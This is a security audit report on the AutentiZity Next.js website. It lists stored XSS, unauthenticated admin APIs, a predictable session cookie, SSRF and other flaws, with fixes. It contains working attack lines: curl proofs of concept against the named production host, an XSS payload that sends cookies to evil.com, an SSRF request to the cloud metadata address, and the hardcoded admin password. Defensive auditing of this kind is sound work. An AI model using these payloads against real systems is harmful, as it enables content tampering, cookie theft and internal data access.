# Security Investigation Report — AutentiZity

**Date:** 2026-06-26
**Score:** 35/100

---

## 1. Summary

AutentiZity is a Next.js 15 corporate website with a public-facing frontend and an admin panel for managing content (news, events, movements, activities, ecosystem). The investigation found **critical authentication flaws**, **stored XSS vulnerabilities**, **unprotected admin API routes**, and **SSRF vectors**. The codebase has some good practices (parameterized DB queries, httpOnly cookies, file size/type checks on upload) but these are undermined by serious gaps in authorization enforcement and output sanitization.

---

## 2. What's Done Well

| Area | Detail |
|---|---|
| **SQL injection protection** | All DB queries use `@neondatabase/serverless` tagged template literals with parameterized values — no string concatenation of user input. |
| **HttpOnly cookies** | The `admin_session` cookie is set with `httpOnly: true` (`src/app/api/auth/login/route.ts:13`), preventing client-side JS from reading it. |
| **SameSite cookie attribute** | Set to `"lax"` (`src/app/api/auth/login/route.ts:15`), providing baseline CSRF protection for browser-initiated requests. |
| **File upload validation** | `/api/upload` checks MIME type against an allowlist of `image/png`, `image/jpeg`, `image/webp` and enforces a 5MB maximum (`src/app/api/upload/route.ts:4,21`). |
| **Image dimension validation** | The crop endpoint validates image dimensions and clips crop coordinates to bounds (`src/app/api/crop/route.ts:54-57`). |
| **Orphan blob cleanup** | When images are replaced or entities deleted, the cleanup module checks referential integrity before deleting from Vercel Blob (`src/lib/data/cleanup.ts`). |
| **Foreign key constraints** | `ecosistema_entidades.section_id`, `movimiento_embajadores`, and `movimiento_actividades` use `REFERENCES ... ON DELETE CASCADE` — referential integrity at DB level (`src/lib/data/schema.ts:166,197,206`). |
| **TypeScript usage** | Full TypeScript across the codebase provides type safety. |
| **`.env` in `.gitignore`** | The `.gitignore` excludes `.env` and `.env*.local` files (`src/.gitignore:35-36`). |

---

## 3. Vulnerabilities Found

### 3.1 [CRITICAL] Hardcoded Admin Credentials

**File:** `src/app/api/auth/login/route.ts:3-4`

```ts
const ADMIN_USER = "admin";
const ADMIN_PASS = "admin1234";
```

Credentials are hardcoded in source code. Anyone with access to the repository (or the deployed source if not properly secured) gets admin access. There is no way to rotate the password without redeploying. The password `admin1234` is extremely weak and appears in common wordlists.

**Severity:** Critical
**Impact:** Full admin compromise by any repository viewer or attacker using a common password

---

### 3.2 [CRITICAL] Admin API Routes Have No Authorization

**File:** `src/middleware.ts:4-22`

The middleware only checks for `admin_session` cookie on paths starting with `/admin`:

```ts
if (pathname.startsWith("/admin") && pathname !== "/admin/login") {
  const session = request.cookies.get("admin_session");
  if (!session || session.value !== "authenticated") {
    // redirect to login
  }
}
```

**The matcher is `["/admin/:path*"]` — API routes under `/api/*` are NOT covered.**

All POST, PUT, DELETE endpoints under `/api/noticias`, `/api/eventos`, `/api/movimientos`, `/api/actividades`, `/api/ecosistema`, `/api/sections`, `/api/upload`, `/api/crop`, `/api/db/setup`, `/api/db/seed` are completely unprotected. An unauthenticated attacker can directly call these endpoints to create, modify, or delete all content.

**Proof of concept:**
```bash
# No auth required — directly deletes a notice
curl -X DELETE https://autentizity.vercel.app/api/noticias/1764691200000

# No auth required — creates a malicious event
curl -X POST https://autentizity.vercel.app/api/eventos \
  -H 'Content-Type: application/json' \
  -d '{"title":"hacked","content":"<script>alert(1)</script>","status":"published"}'
```

**Severity:** Critical
**Impact:** Unauthenticated data tampering, deletion, and content injection on all content types

---

### 3.3 [CRITICAL] Stored XSS via `renderRichText` Without Sanitization

**File:** `src/lib/utils.ts:58-66`

The `sanitize-html` package is installed as a dependency (`package.json:34`) but **is never imported or used anywhere in the codebase**. The `renderRichText` function returns raw HTML from the database without any sanitization:

```ts
export function renderRichText(raw: string): string {
  if (!/<[a-z][\s\S]*>/i.test(raw)) {
    return raw
      .split("\n")
      .map((p) => `<p>${escapeHtml(p)}</p>`)
      .join("");
  }
  return raw;  // <-- RAW HTML RETURNED WITH NO SANITIZATION
}
```

This unsanitized content is rendered via `dangerouslySetInnerHTML` on 9 public-facing page templates:

| Page | Lines |
|---|---|
| `src/app/(public)/noticias/[slug]/page.tsx` | 91, 97 |
| `src/app/(public)/actividades/[slug]/page.tsx` | 59, 62 |
| `src/app/(public)/movimientos/[slug]/page.tsx` | 104, 110 |
| `src/app/(public)/eventos/[slug]/page.tsx` | 102, 108 |

Combined with the unprotected API routes (3.2), an attacker can:
1. POST malicious HTML directly to any content API endpoint (e.g., `/api/noticias` with `content: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"`)
2. Any visitor viewing that content page will execute the attacker's JavaScript

Even without exploiting the API, the admin panel uses TipTap editor (`src/components/admin/RichTextEditor.tsx`) which outputs HTML. A malicious admin (or compromised admin session) can insert arbitrary script tags into content that will execute for all public visitors.

**Severity:** Critical
**Impact:** Stored XSS affecting all site visitors — cookie theft, credential phishing, redirection, defacement

---

### 3.4 [CRITICAL] Predictable Session Cookie Value

**File:** `src/app/api/auth/login/route.ts:12`

```ts
response.cookies.set("admin_session", "authenticated", { ... });
```

The session cookie value is literally the string `"authenticated"`. There is no server-side session, no random token, no JWT, no database-backed session. The middleware check is simply:

```ts
if (!session || session.value !== "authenticated") { ... }
```

An attacker who knows (or guesses) this value can manually set `admin_session=authenticated` in their browser and gain full access to the admin panel.

**Severity:** Critical
**Impact:** Admin panel bypass with a hardcoded cookie value

---

### 3.5 [HIGH] Database Connection String Partially Leaked via API

**File:** `src/app/api/db/status/route.ts:23-34`

The `/api/db/status` endpoint returns a truncated database URL in the response body:

```ts
return NextResponse.json({
  status: "ok",
  message: "Base de datos conectada correctamente",
  dbUrl: `${dbUrl!.substring(0, 30)}...`,  // <-- leaking first 30 chars of DATABASE_URL
  test: result[0],
});
```

Neon connection strings have the format `postgres://user:password@endpoint/name`. Truncating to 30 characters means the user and the start of the password are exposed. This endpoint has no authentication.

**Severity:** High
**Impact:** Partial database credential exposure; combined with other info could enable database access

---

### 3.6 [HIGH] Unprotected Database Admin Endpoints

**Files:**
- `src/app/api/db/setup/route.ts` — schema initialization
- `src/app/api/db/seed/route.ts` — seed data insertion

Both endpoints are accessible via `GET` request with no authentication. The `/api/db/setup` endpoint creates and alters tables. The `/api/db/seed` endpoint inserts mock data. While seed uses `ON CONFLICT DO NOTHING`, the setup endpoint could be abused to run DDL against the production database.

The `db/setup` even has a comment acknowledging the gap:
```ts
// In production, you'd protect this with auth — for now it's open.
```

**Severity:** High
**Impact:** Unauthorized database schema modifications

---

### 3.7 [HIGH] SSRF via Crop Endpoint

**File:** `src/app/api/crop/route.ts:29`

```ts
const response = await fetch(imageUrl);
```

The crop endpoint accepts an `imageUrl` parameter from the request body and fetches it without any validation. An attacker can provide arbitrary URLs pointing to internal services:

```bash
curl -X POST https://autentizity.vercel.app/api/crop \
  -H 'Content-Type: application/json' \
  -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/","crops":{"x":{"x":0,"y":0,"width":100,"height":100}}}'
```

This endpoint also has no authentication. The `imageUrl` is not validated against allowed domains, protocols, or patterns.

**Severity:** High
**Impact:** Server-Side Request Forgery — access to internal cloud metadata, internal services, or port scanning

---

### 3.8 [MEDIUM] No Rate Limiting on Any Endpoint

There is no rate limiting on:
- `/api/auth/login` — vulnerable to brute-force attacks
- `/api/upload` — vulnerable to abuse/DoS
- All other API endpoints

No rate limiting library is in `package.json`. No middleware for request counting exists.

**Severity:** Medium
**Impact:** Brute force on login, resource exhaustion on uploads, API abuse

---

### 3.9 [MEDIUM] No CSRF Protection for Mutating API Routes

There are no CSRF tokens, no `Origin`/`Referer` header validation, and no `SameSite: strict` cookies on mutating endpoints (POST/PUT/DELETE). While the `SameSite: lax` attribute on the auth cookie provides some protection, there are no additional checks on `/api/*` POST/PUT/DELETE handlers.

**Severity:** Medium
**Impact:** If the admin cookie is `SameSite: lax` (current setting), cross-site form submissions could perform state-changing operations in certain scenarios.

---

### 3.10 [MEDIUM] No Content-Security-Policy Headers

**File:** `next.config.ts`

```ts
const nextConfig: NextConfig = {
  images: {
    remotePatterns: [ ... ],
  },
};
```

No security headers are configured. Missing:
- `Content-Security-Policy`
- `X-Content-Type-Options`
- `X-Frame-Options`
- `Strict-Transport-Security`
- `Referrer-Policy`
- `Permissions-Policy`

The `next.config.ts` file has no `headers()` function to set these.

**Severity:** Medium
**Impact:** No defense-in-depth against XSS, clickjacking, MIME sniffing, MITM downgrade

---

### 3.11 [LOW] File Upload MIME Type Validation Only

**File:** `src/app/api/upload/route.ts:14`

```ts
if (!ALLOWED_TYPES.includes(file.type)) { ... }
```

The upload validation only checks `file.type`, which is provided by the client and can be trivially spoofed. The file content/magic bytes are never verified. While Vercel Blob may reject some malformed uploads, the application layer should perform its own content validation using a library like `sharp` to read image metadata before accepting.

**Severity:** Low
**Impact:** A file with a fake MIME type could be uploaded to Vercel Blob

---

### 3.12 [LOW] Upload Uses Original Filename

**File:** `src/app/api/upload/route.ts:29`

```ts
const blob = await put(file.name, file, { ... });
```

The original filename from the client is passed directly to Vercel Blob. While Vercel Blob adds a random suffix, the path contains the original filename, which could include path traversal sequences or special characters.

**Severity:** Low
**Impact:** Filename may contain path traversal characters; mitigated by Vercel Blob's suffix mechanism

---

### 3.13 [LOW] Verbose Error Messages Leaking Internal Details

Several API routes return raw error messages (including exception messages) to the client, which may leak internal implementation details:

- `src/app/api/crop/route.ts:82`: `return NextResponse.json({ error: message }, { status: 500 });`
- `src/app/api/upload/route.ts:39`: `return NextResponse.json({ error: \`Error al subir la imagen: ${message}\` }, ...);`
- `src/app/api/db/seed/route.ts:38`: returns raw error message

**Severity:** Low
**Impact:** Information disclosure aiding attackers

---

## 4. Recommendations (Actionable)

### Priority: CRITICAL

#### 4.1 Move Admin Credentials to Environment Variables

**Fix `src/app/api/auth/login/route.ts`:**

```ts
// BEFORE (current):
const ADMIN_USER = "admin";
const ADMIN_PASS = "admin1234";

// AFTER:
const ADMIN_USER = process.env.ADMIN_USER;
const ADMIN_PASS = process.env.ADMIN_PASS;

export async function POST(request: NextRequest) {
  const body = await request.json();
  const { username, password } = body;

  if (!ADMIN_USER || !ADMIN_PASS) {
    return NextResponse.json(
      { error: "Server not configured" },
      { status: 500 }
    );
  }

  if (username === ADMIN_USER && password === ADMIN_PASS) {
    // ... set session
  }
  // ...
}
```

Then add `ADMIN_USER` and `ADMIN_PASS` to Vercel environment variables. Use a strong, randomly generated password (e.g., `openssl rand -base64 32`).

#### 4.2 Implement Proper Session Management

**Replace the hardcoded `"authenticated"` value with a cryptographically random token:**

```ts
import { randomBytes } from "crypto";
import { cookies } from "next/headers";

// Use jwt or iron-session for proper sessions
// Minimal improvement: random token stored in a Set or Map (server-side)

const sessions = new Map<string, number>(); // token -> expiry

function createSession(): string {
  const token = randomBytes(32).toString("hex");
  sessions.set(token, Date.now() + 8 * 60 * 60 * 1000);
  return token;
}

function isValidSession(token: string): boolean {
  const expiry = sessions.get(token);
  if (!expiry) return false;
  if (Date.now() > expiry) {
    sessions.delete(token);
    return false;
  }
  return true;
}
```

Better still, use `jose` (already in Next.js ecosystem) for JWT-based sessions with RS256.

#### 4.3 Protect All Admin API Routes with Middleware

**Fix `src/middleware.ts`:**

```ts
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

// Routes that require admin session
const PROTECTED_PREFIXES = ["/admin", "/api"];
// Except login endpoint and public reads
const PUBLIC_API_PREFIXES = [
  "/api/auth/login",
  "/api/auth/logout",
  "/admin/login",
];

// Public GET-only API routes (read-only, data exposed on public site anyway)
const PUBLIC_GET_API = [
  "/api/noticias",
  "/api/eventos",
  "/api/movimientos",
  "/api/actividades",
  "/api/ecosistema/entidades",
  "/api/ecosistema/secciones",
  "/api/sections",
];

export function middleware(request: NextRequest) {
  const { pathname, method } = request.nextUrl;

  // Allow public pages and login
  if (PUBLIC_API_PREFIXES.some((p) => pathname.startsWith(p))) {
    return NextResponse.next();
  }

  // Allow public GET requests to read-only data endpoints
  if (
    method === "GET" &&
    PUBLIC_GET_API.some((p) => pathname.startsWith(p))
  ) {
    return NextResponse.next();
  }

  // All other /admin and /api routes require authentication
  const needsAuth = PROTECTED_PREFIXES.some((p) => pathname.startsWith(p));
  if (needsAuth) {
    const session = request.cookies.get("admin_session");
    if (!session || !isValidSession(session.value)) {
      if (pathname.startsWith("/api")) {
        return NextResponse.json(
          { error: "Unauthorized" },
          { status: 401 }
        );
      }
      const loginUrl = new URL("/admin/login", request.url);
      loginUrl.searchParams.set("from", pathname);
      return NextResponse.redirect(loginUrl);
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/admin/:path*", "/api/:path*"],
};
```

#### 4.4 Fix Stored XSS — Use `sanitize-html` in `renderRichText`

**Fix `src/lib/utils.ts`:**

```ts
import sanitizeHtml from "sanitize-html";

const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: [
    "h1", "h2", "h3", "h4", "h5", "h6",
    "p", "br", "hr",
    "ul", "ol", "li",
    "blockquote", "pre", "code",
    "strong", "em", "u", "s", "del",
    "a", "img", "iframe",
    "figure", "figcaption",
    "div", "span",
  ],
  allowedAttributes: {
    a: ["href", "title", "target", "rel"],
    img: ["src", "alt", "title", "width", "height"],
    iframe: ["src", "width", "height", "frameborder", "allowfullscreen"],
    "*": ["class", "style"],
  },
  allowedSchemes: ["http", "https", "mailto"],
  allowedStyles: {
    "*": {
      "text-align": [/^left$/, /^right$/, /^center$/],
    },
  },
  // Only allow iframes from YouTube
  allowedIframeHostnames: ["www.youtube.com", "www.youtube-nocookie.com"],
};

export function renderRichText(raw: string): string {
  if (!/<[a-z][\s\S]*>/i.test(raw)) {
    return raw
      .split("\n")
      .map((p) => `<p>${escapeHtml(p)}</p>`)
      .join("");
  }
  return sanitizeHtml(raw, SANITIZE_OPTIONS);
}
```

Also add server-side sanitization in all POST/PUT API routes before saving to database:

```ts
// In every POST/PUT handler
import sanitizeHtml from "sanitize-html";
// ...
const noticia = {
  // ...
  content: sanitizeHtml(body.content ?? "", SANITIZE_OPTIONS),
  excerpt: sanitizeHtml(body.excerpt ?? "", { allowedTags: [] }), // plain text only
  // ...
};
```

### Priority: HIGH

#### 4.5 Remove Database URL Leak from Status Endpoint

**Fix `src/app/api/db/status/route.ts`:**

```ts
// REMOVE these lines:
// dbUrl: `${dbUrl!.substring(0, 30)}...`,

// REPLACE with:
return NextResponse.json({
  status: "ok",
  message: "Base de datos conectada correctamente",
  test: result[0],
});
```

And add authentication to this endpoint.

#### 4.6 Protect Database Admin Endpoints

**Fix `src/app/api/db/setup/route.ts` and `src/app/api/db/seed/route.ts`:**

Add a header-based admin token check:

```ts
import { NextRequest, NextResponse } from "next/server";

export async function GET(request: NextRequest) {
  const token = request.headers.get("x-admin-token");
  if (token !== process.env.ADMIN_API_TOKEN) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }
  // ... rest of handler
}
```

Or better, apply the same session-check middleware as recommended in 4.3.

#### 4.7 Fix SSRF in Crop Endpoint

**Fix `src/app/api/crop/route.ts`:**

```ts
// Validate imageUrl is a Vercel Blob URL before fetching
function isValidImageUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    // Only allow Vercel Blob Storage URLs
    if (!parsed.hostname.endsWith("public.blob.vercel-storage.com")) {
      return false;
    }
    // Only allow https
    if (parsed.protocol !== "https:") {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

export async function POST(request: Request): Promise<NextResponse> {
  try {
    const body = await request.json();
    const { imageUrl, crops } = body;

    if (!imageUrl || !crops || Object.keys(crops).length === 0) {
      return NextResponse.json(
        { error: "imageUrl and crops are required" },
        { status: 400 }
      );
    }

    // SSRF protection: only allow known blob URLs
    if (!isValidImageUrl(imageUrl)) {
      return NextResponse.json(
        { error: "Invalid image URL" },
        { status: 400 }
      );
    }

    // ... rest of handler
  }
}
```

Also add authentication to this endpoint.

### Priority: MEDIUM

#### 4.8 Add Rate Limiting

Install and configure a rate limiter:

```bash
npm install @upstash/ratelimit @upstash/redis
```

Or use a simpler approach with Vercel KV or a middleware-based solution:

```ts
// src/middleware.ts — rate limiting via Map (in-memory, resets on cold start)
const rateLimitMap = new Map<string, { count: number; resetTime: number }>();

function rateLimit(ip: string, limit: number, windowMs: number): boolean {
  const now = Date.now();
  const entry = rateLimitMap.get(ip);
  if (!entry || now > entry.resetTime) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + windowMs });
    return true;
  }
  if (entry.count >= limit) return false;
  entry.count++;
  return true;
}
```

Apply to `/api/auth/login` with stricter limits (e.g., 5 attempts per 15 minutes).

#### 4.9 Add CSRF Protection

For Next.js Server Actions and API routes, implement CSRF token validation:

```ts
// Generate CSRF token on login
import { randomBytes } from "crypto";

function generateCsrfToken(): string {
  return randomBytes(32).toString("hex");
}

// Set in cookie and return in response body
// Client sends it back via header on mutations

// In middleware: validate for POST/PUT/DELETE /api/* routes
if (method !== "GET" && method !== "HEAD" && method !== "OPTIONS") {
  const csrfCookie = request.cookies.get("csrf_token");
  const csrfHeader = request.headers.get("x-csrf-token");
  if (!csrfCookie || !csrfHeader || csrfCookie.value !== csrfHeader) {
    return NextResponse.json({ error: "Invalid CSRF token" }, { status: 403 });
  }
}
```

#### 4.10 Add Security Headers

**Fix `next.config.ts`:**

```ts
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  images: {
    remotePatterns: [
      { protocol: "https" as const, hostname: "**" },
    ],
  },
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          {
            key: "Content-Security-Policy",
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.vercel.live",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: blob: https:",
              "font-src 'self'",
              "frame-src https://www.youtube.com https://www.youtube-nocookie.com",
              "connect-src 'self' https://*.vercel-storage.com https://*.blob.vercel-storage.com",
              "media-src 'self'",
              "object-src 'none'",
              "base-uri 'self'",
              "form-action 'self'",
            ].join("; "),
          },
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
          {
            key: "X-Frame-Options",
            value: "DENY",
          },
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin",
          },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=()",
          },
        ],
      },
      {
        source: "/api/(.*)",
        headers: [
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

For production, also configure `Strict-Transport-Security` at the infrastructure level (Vercel handles this by default).

### Priority: LOW

#### 4.11 Validate File Content (Magic Bytes) on Upload

**Fix `src/app/api/upload/route.ts`:**

```ts
import sharp from "sharp";

export async function POST(request: Request): Promise<NextResponse> {
  const formData = await request.formData();
  const file = formData.get("file") as File | null;

  // ... existing checks ...

  // Verify the file is actually an image by reading its metadata
  try {
    const buffer = Buffer.from(await file.arrayBuffer());
    await sharp(buffer).metadata(); // throws if not a valid image
  } catch {
    return NextResponse.json(
      { error: "El archivo no es una imagen válida" },
      { status: 400 }
    );
  }

  // ... proceed with upload ...
}
```

Note: you will need to re-read the file as FormData entries are single-use. An alternative is to read the buffer first and pass it to both validation and upload.

#### 4.12 Sanitize Upload Filename

```ts
// Generate a safe filename
const safeName = file.name
  .replace(/[^a-zA-Z0-9._-]/g, "_")  // remove special chars
  .replace(/\.\./g, ".")              // remove path traversal
  .substring(0, 200);                 // limit length

const blob = await put(safeName, buffer, {
  access: "public",
  addRandomSuffix: true,
});
```

#### 4.13 Generic Error Messages for Production

```ts
// Instead of:
return NextResponse.json(
  { error: `Error al subir la imagen: ${message}` },
  { status: 500 }
);

// Use:
console.error("Upload error:", error); // log full error server-side
return NextResponse.json(
  { error: "Error interno del servidor" },
  { status: 500 }
);
```

---

## 5. Scoring Breakdown

| Category | Weight | Score | Notes |
|---|---|---|---|
| Authentication & Session Management | 25 | 5 | Hardcoded credentials, predictable cookie, no session store |
| Input Validation & Output Sanitization | 20 | 5 | SQL injection protected, but XSS wide open, sanitize-html unused |
| Authorization & Access Control | 20 | 4 | Admin pages protected, but zero API route protection |
| Security Headers (CSP, HSTS, etc.) | 10 | 2 | No security headers configured |
| CSRF Protection | 10 | 4 | SameSite:lax helps, but no CSRF tokens on mutating endpoints |
| Rate Limiting | 5 | 0 | None implemented |
| File Upload Security | 5 | 3 | Type/size checks but no content validation, auth, or filename sanitization |
| Error Handling & Info Disclosure | 5 | 3 | Some verbose errors; DB URL leaked in status endpoint |
| **Total** | **100** | **35** | |

---

## 6. Remediation Priority Order

1. **Protect all API routes with auth** (middleware — 4.3) — blocks the most accessible attack vectors
2. **Sanitize HTML output** (`renderRichText` + input sanitization — 4.4) — prevents stored XSS
3. **Move credentials to env vars** (4.1) + **Implement proper sessions** (4.2) — fixes auth
4. **Fix SSRF in crop endpoint** (4.7) + **Remove DB URL leak** (4.5) — plugs info/access leaks
5. **Add security headers** (4.10) + **Rate limiting** (4.8) — defense-in-depth
6. **Protect DB admin endpoints** (4.6) + **CSRF tokens** (4.9) — harden mutating routes
7. **File upload hardening** (4.11, 4.12) + **Error message cleanup** (4.13) — polish

---

*Report prepared for the AutentiZity development team. No code changes were made during this investigation.*
